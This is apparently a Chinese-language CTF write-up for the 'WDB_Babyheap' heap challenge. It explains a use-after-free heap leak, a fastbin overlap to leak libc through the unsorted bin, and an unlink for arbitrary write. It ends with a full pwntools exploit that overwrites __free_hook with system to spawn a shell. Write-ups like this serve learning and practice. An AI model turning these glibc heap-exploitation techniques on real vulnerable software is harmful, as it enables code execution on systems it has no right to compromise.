---
title: WDB_Babyheap
date: 2018-09-23 11:38:12
tags: pwn heap
layout: post
---
UAF & Unlink
<!--more-->
# Analysis
```sh
➜  babyheap checksec babyheap
[*] '/home/nier/Desktop/babyheap/babyheap'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```
想办法控制执行流或者是改写hooks
简单的菜单堆题
每次malloc(0x30)size不可控
重点是泄露libc地址和实现任意地址写

# Leak heap
可以利用show和fastbin泄露heap
```c
add(0)
add(1)
free(1)
free(0)
show(0)
```
# Leak Libc By over lap
这个就比较头疼了..之前没搞过
但是发现可以先fast_bin_atk 控制size位--->0xa0
这样就可以放到unsortedbin里拿到libc_base
```python
edit(1,p64(heap+0x10))
add(2)
add(3)
add_1(4,p64(0)+p64(0)+p64(0)+p64(0xa1))
add(5,"/bin/sh")
add(6)
add_1(7,p64(0)+p64(0x31)+p64(ptr-0x18)+p64(ptr-0x10))
add(8,p64(0)+p64(0x30))
#to deal with the next_chunk's pre_inuse#
free(1)
show(1)
```
# write Any Address
有了一个unsortedbin就想到了unlink
直接控制bss中ptr数组 实现任意地址写
改写__free_hook为system
free("/bin/sh")

# EXP
```python
from pwn import *
#context.log_level="debug"
def cmd(c):
	p.sendlineafter("Choice:",str(c))
def add(idx,c=""):
	cmd(1)
	p.sendlineafter("Index:",str(idx))
	p.sendlineafter("Content:",c)
def edit(idx,c):
	cmd(2)
	p.sendlineafter("Index:",str(idx))
	p.sendlineafter("Content:",c)
def add_1(idx,c):
	cmd(1)
	p.sendlineafter("Index:",str(idx))
	p.sendafter("Content:",c)
def show(idx):
	cmd(3)
	p.sendlineafter("Index:",str(idx))
def free(idx):
	cmd(4)
	p.sendlineafter("Index:",str(idx))

ptr=0x602068+6*8
p=process("./babyheap")
libc=ELF("/mlibc/64/lib/libc-2.23.so")
#start leak#
add(0,p64(0)+p64(0x31))
add(1)
free(1)
free(0)
show(0)
data=p.readline()
heap=u64(data[:-1].ljust(8,"\0"))-(0x1e94030-0x1e94000)
log.warning(hex(heap))
#leaking heap over and start to make lap#
edit(1,p64(heap+0x10))
add(2)
add(3)
add_1(4,p64(0)+p64(0)+p64(0)+p64(0xa1))
add(5,"/bin/sh")
add(6)
add_1(7,p64(0)+p64(0x31)+p64(ptr-0x18)+p64(ptr-0x10))
add(8,p64(0)+p64(0x30))
#to deal with the next_chunk's pre_inuse#
free(1)
show(1)
data=p.readline()
base=u64(data[:-1].ljust(8,"\0"))-(0x00007ffff7dd4b78-0x7ffff7a39000)
log.warning(hex(base))
libc.address=base
edit(7,p64(libc.symbols['__free_hook']))
edit(4,p64(libc.symbols['system']))
add(9,"/bin/sh")
free(9)
p.interactive(">")
```
## Recview
都是基本套路...
还不太熟练unlink看了好久源码好些了
